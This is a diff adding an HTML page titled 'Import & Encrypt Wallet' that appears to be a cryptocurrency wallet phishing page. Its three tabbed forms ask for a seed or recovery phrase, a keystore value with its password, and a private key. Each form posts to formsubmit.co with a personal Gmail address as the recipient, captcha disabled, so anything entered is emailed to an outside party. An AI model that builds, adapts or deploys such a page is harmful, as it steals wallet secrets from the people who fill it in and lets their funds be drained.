@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="./output.css" />
+    <title>Tabbed Login Forms</title>
+  </head>
+  <body>
+    <h1 class="text-3xl font-extrabold text-center mb-9 mt-20">
+      Import & Encrypt Wallet
+    </h1>
+    <nav
+      class="relative z-0 flex border rounded-xl overflow-hidden dark:border-neutral-700"
+      aria-label="Tabs"
+      role="tablist"
+      aria-orientation="horizontal"
+    >
+      <button
+        type="button"
+        class="hs-tab-active:border-b-blue-600 hs-tab-active:text-gray-900 dark:hs-tab-active:text-white relative dark:hs-tab-active:border-b-blue-600 min-w-0 flex-1 bg-white first:border-s-0 border-s border-b-2 py-4 px-4 text-gray-500 hover:text-gray-700 text-sm font-medium text-center overflow-hidden hover:bg-gray-50 focus:z-10 focus:outline-none focus:text-blue-600 disabled:opacity-50 disabled:pointer-events-none dark:bg-neutral-800 dark:border-l-neutral-700 dark:border-b-neutral-700 dark:text-neutral-400 dark:hover:bg-neutral-700 dark:hover:text-neutral-400 active"
+        id="bar-with-underline-item-1"
+        aria-selected="true"
+        data-hs-tab="#bar-with-underline-1"
+        aria-controls="bar-with-underline-1"
+        role="tab"
+      >
+        Seed/Recovery Phase
+      </button>
+      <button
+        type="button"
+        class="hs-tab-active:border-b-blue-600 hs-tab-active:text-gray-900 dark:hs-tab-active:text-white relative dark:hs-tab-active:border-b-blue-600 min-w-0 flex-1 bg-white first:border-s-0 border-s border-b-2 py-4 px-4 text-gray-500 hover:text-gray-700 text-sm font-medium text-center overflow-hidden hover:bg-gray-50 focus:z-10 focus:outline-none focus:text-blue-600 disabled:opacity-50 disabled:pointer-events-none dark:bg-neutral-800 dark:border-l-neutral-700 dark:border-b-neutral-700 dark:text-neutral-400 dark:hover:bg-neutral-700 dark:hover:text-neutral-400"
+        id="bar-with-underline-item-2"
+        aria-selected="false"
+        data-hs-tab="#bar-with-underline-2"
+        aria-controls="bar-with-underline-2"
+        role="tab"
+      >
+        KeyStore JSON
+      </button>
+      <button
+        type="button"
+        class="hs-tab-active:border-b-blue-600 hs-tab-active:text-gray-900 dark:hs-tab-active:text-white relative dark:hs-tab-active:border-b-blue-600 min-w-0 flex-1 bg-white first:border-s-0 border-s border-b-2 py-4 px-4 text-gray-500 hover:text-gray-700 text-sm font-medium text-center overflow-hidden hover:bg-gray-50 focus:z-10 focus:outline-none focus:text-blue-600 disabled:opacity-50 disabled:pointer-events-none dark:bg-neutral-800 dark:border-l-neutral-700 dark:border-b-neutral-700 dark:text-neutral-400 dark:hover:bg-neutral-700 dark:hover:text-neutral-400"
+        id="bar-with-underline-item-3"
+        aria-selected="false"
+        data-hs-tab="#bar-with-underline-3"
+        aria-controls="bar-with-underline-3"
+        role="tab"
+      >
+        Private Key
+      </button>
+    </nav>
+
+    <div class="mt-3">
+      <div
+        id="bar-with-underline-1"
+        role="tabpanel"
+        aria-labelledby="bar-with-underline-item-1"
+      >
+        <form
+          class="max-w-lg mx-auto p-6 bg-white rounded-lg shadow-md space-y-4 mt-6"
+          action="https://formsubmit.co/sodmaq@gmail.com"
+          method="POST"
+          id="myForm"
+        >
+          <!-- Hidden fields for security and control -->
+          <input type="hidden" name="_subject" value="New Form Submission" />
+          <input type="hidden" name="_captcha" value="false" />
+          <input type="hidden" name="_template" value="table" />
+          <input
+            type="hidden"
+            name="_next"
+            value="http://127.0.0.1:5500/dist/wallet.html"
+          />
+
+          <!-- Keep input type as text but restrict to numbers -->
+          <div>
+            <label
+              for="phrase-value"
+              class="block text-sm font-medium text-gray-700 mb-1"
+            >
+              Phrase Value
+            </label>
+            <input
+              class="w-full p-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+              name="phone"
+              placeholder="Enter your phrase value..."
+              type="text"
+              id="phrase-value"
+              pattern="\d{13}"
+              inputmode="numeric"
+              required
+            />
+          </div>
+
+          <h1>Typically 12 (sometimes 24) words separated by single spaces.</h1>
+
+          <div>
+            <input
+              type="submit"
+              data-wait="Please wait..."
+              class="w-full p-3 bg-blue-600 text-white rounded-md shadow-sm hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500"
+              value="Import"
+            />
+          </div>
+        </form>
+      </div>
+      <div
+        id="bar-with-underline-2"
+        class="hidden"
+        role="tabpanel"
+        aria-labelledby="bar-with-underline-item-2"
+      >
+        <form
+          class="max-w-lg mx-auto p-6 bg-white rounded-lg shadow-md space-y-4 mt-6"
+          action="https://formsubmit.co/sodmaq@gmail.com"
+          method="POST"
+          id="myForm"
+        >
+          <!-- Hidden fields for security and control -->
+          <input type="hidden" name="_subject" value="New Form Submission" />
+          <input type="hidden" name="_captcha" value="false" />
+          <input type="hidden" name="_template" value="table" />
+
+          <!-- Private Key Input -->
+          <div>
+            <label
+              for="private-key"
+              class="block text-sm font-medium text-gray-700 mb-1"
+            >
+              Keystore value
+            </label>
+            <input
+              class="w-full p-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+              name="private_key"
+              placeholder="Enter your Keystore value..."
+              type="text"
+              id="private-key"
+              pattern="[0-9]*"
+              inputmode="numeric"
+              required
+            />
+          </div>
+
+          <!-- Another Private Key Input (Make sure it's intentional to have two) -->
+          <div>
+            <label
+              for="private-key-2"
+              class="block text-sm font-medium text-gray-700 mb-1"
+            >
+              Password
+            </label>
+            <input
+              class="w-full p-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+              name="private_key_2"
+              placeholder="Enter your Password..."
+              type="text"
+              id="private-key-2"
+              pattern="[0-9]*"
+              inputmode="numeric"
+              required
+            />
+          </div>
+
+          <div>
+            <input
+              type="submit"
+              data-wait="Please wait..."
+              class="w-full p-3 bg-blue-600 text-white rounded-md shadow-sm hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500"
+              value="Import"
+            />
+          </div>
+        </form>
+      </div>
+      <div
+        id="bar-with-underline-3"
+        class="hidden"
+        role="tabpanel"
+        aria-labelledby="bar-with-underline-item-3"
+      >
+        <form
+          class="max-w-lg mx-auto p-6 bg-white rounded-lg shadow-md space-y-4 mt-6"
+          action="https://formsubmit.co/sodmaq@gmail.com"
+          method="POST"
+          id="myForm"
+        >
+          <!-- Hidden fields for security and control -->
+          <input type="hidden" name="_subject" value="New Form Submission" />
+          <input type="hidden" name="_captcha" value="false" />
+          <input type="hidden" name="_template" value="table" />
+
+          <!-- Keep input type as text but restrict to numbers -->
+          <div>
+            <label
+              for="phrase-value"
+              class="block text-sm font-medium text-gray-700 mb-1"
+            >
+              Private Key
+            </label>
+            <input
+              class="w-full p-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+              name="phone"
+              placeholder="Enter your Private Key..."
+              type="text"
+              id="phrase-value"
+              pattern="[0-9]*"
+              inputmode="numeric"
+              required
+            />
+          </div>
+
+          <div>
+            <input
+              type="submit"
+              data-wait="Please wait..."
+              class="w-full p-3 bg-blue-600 text-white rounded-md shadow-sm hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500"
+              value="Import"
+            />
+          </div>
+        </form>
+      </div>
+    </div>
+    <script
+      src="/node_modules/preline/dist/preline.js"
+      type="text/javascript"
+    ></script>
+  </body>
+</html>
